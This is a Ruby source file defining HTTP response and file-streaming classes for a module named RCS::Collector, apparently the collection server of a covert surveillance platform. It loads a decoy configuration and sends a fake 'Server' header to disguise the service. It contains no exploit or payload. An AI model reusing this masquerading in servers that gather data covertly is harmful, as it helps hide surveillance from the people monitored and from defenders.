#
# response handling classes
#

require_relative 'em_streamer'
require_relative '../../config/decoy'

# from RCS::Common
require 'rcs-common/trace'

require 'net/http'

module RCS
module Collector

class RESTResponse
  include RCS::Tracer

  attr_accessor :status, :content, :content_type, :cookie

  def initialize(status, content = '', opts = {}, callback=proc{})
    @status = status
    @status = RESTController::STATUS_SERVER_ERROR if @status.nil? or @status.class != Fixnum
    
    @content = content
    @content_type = opts[:content_type]
    @content_type ||= 'text/html'
    @location ||= opts[:location]
    @cookie ||= opts[:cookie]
    
    @callback=callback
  end

  #
  # BEWARE: for any reason this method should raise an exception!
  # An exception raised here WILL NOT be cough, resulting in a crash.
  #
  def prepare_response(connection, request)

    @request = request
    @connection = connection
    @response = EM::DelegatedHttpResponse.new @connection

    @response.status = @status
    @response.status_string = ::Net::HTTPResponse::CODE_TO_OBJ["#{@response.status}"].name.gsub(/Net::HTTP/, '')

    begin
      @response.content = (@content_type == 'application/json') ? @content.to_json : @content
    rescue Exception => e
      @response.status = RESTController::STATUS_SERVER_ERROR
      @response.content = 'JSON_SERIALIZATION_ERROR'
      trace :error, e.message
      trace :fatal, "EXCEPTION(#{e.class}): " + e.backtrace.join("\n")
    end

    expiry = (Time.now() + 86400).strftime('%A, %d-%b-%y %H:%M:%S %Z')

    @response.headers['Content-Type'] = @content_type
    @response.headers['Set-Cookie'] = "ID=" + @cookie unless @cookie.nil?

    # fake server reply
    @response.headers['Server'] = FakeServer::SERVER_STRING

    # date header
    @response.headers['Date'] = Time.now.getutc.strftime("%a, %d %b %Y %H:%M:%S %Z")

    # used for redirects
    @response.headers['Location'] = @location unless @location.nil?

    if request[:headers] && request[:headers][:connection] && request[:headers][:connection].downcase == 'keep-alive'
      # keep the connection open to allow multiple requests on the same connection
      # this will increase the speed of sync since it decrease the latency on the net
      @response.keep_connection_open true
      @response.headers['Connection'] = 'keep-alive'
    else
      @response.headers['Connection'] = 'close'
    end

    self
  end

  def content
    @response.content
  end

  def headers
    @response.headers
  end

  def send_response
    @response.send_response
    @callback
  end

end # RESTResponse

class RESTFileStream

  def initialize(filename, callback=proc{})
    @filename = filename
    @callback = callback
  end

  def prepare_response(connection, request)

    @request = request
    @connection = connection
    @response = EM::DelegatedHttpResponse.new @connection

    @response.status = RESTController::STATUS_OK
    @response.status_string = ::Net::HTTPResponse::CODE_TO_OBJ["#{@response.status}"].name.gsub(/Net::HTTP/, '')

    @response.headers["Content-length"] = File.size @filename
    @response.headers["ETag"] = Digest::MD5.file(@filename).hexdigest

    # fixup_headers override to evade content-length reset
    metaclass = class << @response; self; end
    metaclass.send(:define_method, :fixup_headers, proc {})

    # RCS::MimeType (rcs-common)
    @response.headers["Content-Type"] = RCS::MimeType.get @filename

    if request[:headers] && request[:headers][:connection] && request[:headers][:connection].downcase == 'keep-alive'
      # keep the connection open to allow multiple requests on the same connection
      # this will increase the speed of sync since it decrease the latency on the net
      @response.keep_connection_open true
      @response.headers['Connection'] = 'keep-alive'
    else
      @response.headers['Connection'] = 'close'
    end

    self
  end

  def content
    @response.content
  end

  def headers
    @response.headers
  end

  def send_response
    @response.send_headers
    streamer = EventMachine::FilesystemStreamer.new(@connection, @filename, :http_chunks => false )
    streamer.callback { @callback.call } unless @callback.nil?
  end
end # RESTFileStream

end # ::Collector
end # ::RCS
